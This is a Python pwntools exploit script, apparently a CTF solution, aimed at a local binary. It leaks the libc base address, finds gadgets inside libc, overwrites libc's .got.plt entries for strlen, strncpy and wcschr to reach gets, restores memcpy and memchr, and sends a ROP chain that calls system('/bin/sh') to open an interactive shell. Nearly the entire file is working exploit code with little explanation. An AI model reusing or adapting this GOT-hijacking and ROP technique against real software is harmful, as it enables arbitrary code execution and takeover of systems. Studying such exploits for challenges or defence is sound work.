from pwn import *

context.arch = 'amd64'
# context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']


def find_gadget_to_set_rdi(libc):  # Find a gadget to set RDI as the address on the stack.
    addr = libc.sym['login']  # will call strncpy
    libc_data = open(libc.path, 'rb').read()
    for off in range(addr, addr + 0x100000):
        if libc_data[off:off + 3] == b'\x48\x8d\x7c':  # find lea rdi, [rsp+24], ... call j_strncpy
            res = disasm(libc_data[off:off + 20], offset=False, byte=False).replace('\n', ';')
            if 'call' not in res:
                continue
            return off
    return 0


def find_call_pop_ret_gadget(libc):  # Find a gadget to call a function and pop the stack.
    addr = libc.sym['wcscspn']  # will call wcschr
    libc_data = open(libc.path, 'rb').read()
    for off in range(addr, addr + 0x1000):
        if libc_data[off] == 0xe8:  # find call j_wcschr why 0xe8 ? 
            return off
    return 0


def find_original_value_memcpy_got_plt(libc):
    off = libc.sym['memcpy'] + 0x7F  # hardcode
    libc_data = open(libc.path, 'rb').read()
    if libc_data[off: off + 2] == b'\x48\x8d':
        opcode = libc_data[off + 3:off + 5].ljust(8, b'\x00')
        memcpy_sse2_unaligned_erms_addr = u64(opcode) + off + 7
        return memcpy_sse2_unaligned_erms_addr
    return 0


def find_original_value_memchr_got_plt(libc):
    off = libc.sym['memchr'] + 0xb  # hardcode
    libc_data = open(libc.path, 'rb').read()
    if libc_data[off: off + 2] == b'\x48\x8d':
        opcode = libc_data[off + 3:off + 5].ljust(8, b'\x00')
        memchr_sse2_addr = u64(opcode) + off + 7
        return memchr_sse2_addr
    return 0


def get_got_plt_table(libc):  # Thank @leommxj for help with this function code.
    it = libc.get_section_by_name('.rela.plt').iter_relocations()
    irelas = []
    r = {}
    for i in it:
        if i['r_info'] == 0x25:
            irelas.append(i)
    revsymbols = defaultdict(list)
    for name, addr in libc.symbols.items():
        revsymbols[addr].append(name)
        if 'got.' in name:
            r[name] = addr
    for i in irelas:
        symname = revsymbols[i['r_addend']]
        r[symname[-1]] = i['r_offset']
    return r


def xrop(libc, table, func, gadget_one, gadget_two):
    tab = [x for x in range(0x2b)]

    dest = libc.get_section_by_name('.got.plt').header.sh_addr + 24
    info('Write dest: {}'.format(hex(dest)))

    # Hijack strlen to the first gadget, and set the value of rdi.
    func_got_plt = table[func]
    idx = (func_got_plt - dest) // 8
    info('strlen.got.plt idx is : {}'.format(hex(idx)))
    tab[idx] = gadget_one + libc.address
    info("first gadget is : {}".format(hex(tab[idx])))

    # Hijack strncpy with the value of the second gadget to call gets and subsequent ret. 
    idx = (table['strncpy'] - dest) // 8
    info('strncpy.got.plt idx is : {}'.format(hex(idx)))
    tab[idx] = gadget_two + libc.address
    info("second gadget is : {}".format(hex(tab[idx])))

    # Hijack wschr with to the gets function.
    idx = (table['wcschr'] - dest) // 8
    info('idx3: {}'.format(hex(idx)))
    tab[idx] = libc.sym['gets']

    #  will call gets need fix  
    idx = (table['memcpy'] - dest) // 8
    info('memcpy idx: {}'.format(hex(idx)))
    info('memcpy addrss: {}'.format(hex(orginal_memcpy_addr)))
    tab[idx] = orginal_memcpy_addr + libc.address

    idx = (table['memchr'] - dest) // 8
    info('memchr idx: {}'.format(hex(idx)))
    info('memchr addrss: {}'.format(hex(libc.sym['memchr'])))
    tab[idx] = orginal_memchr_addr + libc.address

    return dest + libc.address, flat(tab)


elf = ELF('./main')
libc = elf.libc
p = process("./main")
# gdb.attach(p, '')

got_plt_table = get_got_plt_table(libc)
first_gadget = find_gadget_to_set_rdi(libc)
second_gadget = find_call_pop_ret_gadget(libc)

# Our ultimate goal is to call the gets function, which will call the memcpy and memchr functions.
# These two functions have been overwritten at the position of the .got.plt table, so we need to restore their original values.
orginal_memcpy_addr = find_original_value_memcpy_got_plt(libc)
orginal_memchr_addr = find_original_value_memchr_got_plt(libc)

success("first gadget is {}".format(hex(first_gadget)))
success("second gadget is {}".format(hex(second_gadget)))

base = int(p.readline(), 16) - libc.sym['printf']  # 0x5c740
success('Libc base: {}'.format(hex(base)))
libc.address = base

rop = ROP(libc)
rdi = rop.find_gadget(["pop rdi", 'ret'])[0]
ret = rdi + 1

#  Trigger puts, which is in the target binary
#  The strlen function will be called by the puts function.
dest, payload = xrop(libc, got_plt_table, 'strlen', first_gadget, second_gadget)
success('dest addr: {}'.format(hex(dest)))
p.send(p64(dest))
p.send(p64(len(payload)))
p.send(payload)
p.sendline(flat([1, 2, 3, ret, ret, ret, ret, rdi, libc.search(b"/bin/sh").__next__(), libc.sym['system'] + 27]))

p.interactive()
